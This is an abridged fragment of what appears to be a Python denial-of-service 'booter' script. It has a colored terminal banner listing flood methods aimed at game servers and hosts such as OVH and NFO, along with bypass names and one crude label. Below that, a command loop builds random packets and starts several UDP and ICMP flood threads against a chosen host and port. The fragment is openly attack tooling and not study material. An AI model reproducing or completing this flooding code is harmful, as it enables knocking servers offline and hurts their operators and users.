...
\x1b[0;38;2;0;165;255m                      ║\x1b[0m           Type "help" for commands.           \x1b[0;38;2;0;165;255m║
...
\x1b[0;38;2;0;157;255m               	    ║\x1b[31m   XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX   \x1b[0;38;2;0;157;255m║
...
\x1b[0;38;2;0;211;255m            ║      FORTNITE ● OVH      ║      OVHAMP ● NFOCRUSH     ║
\x1b[0;38;2;0;211;255m            ║     NFODROP ● OVHNAT     ║      TELNET ● OVHKILL      ║
\x1b[0;38;2;0;200;255m            ╚╦════════════════════════╦╩╦══════════════════════════╦╝
\x1b[0;38;2;0;189;255m             ║     OVHDOWN ● SSDP     ║ ║  OVHNULL ● ROBLOXBYPASS  ║
\x1b[0;38;2;0;178;255m             ║  HYDRAKILLER ● NFONULL ║ ║    NFORAPE ● XXXXXXXXX   ║
	...
	while True:
		...
		if sinput == "home":
			...
			try:
					...
					punch = random._urandom(int(pack))
					threading.Thread(target=randsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=udpsender, args=(host, port, timer, payload)).start()
					threading.Thread(target=killallicmp, args=(host, port, timer, payload)).start()
					threading.Thread(target=killallvse, args=(host, port, timer, payload)).start()
					threading.Thread(target=mixudp, args=(host, port, timer, payload)).start()
					threading.Thread(target=killalludp, args=(host, port, timer, payload)).start()
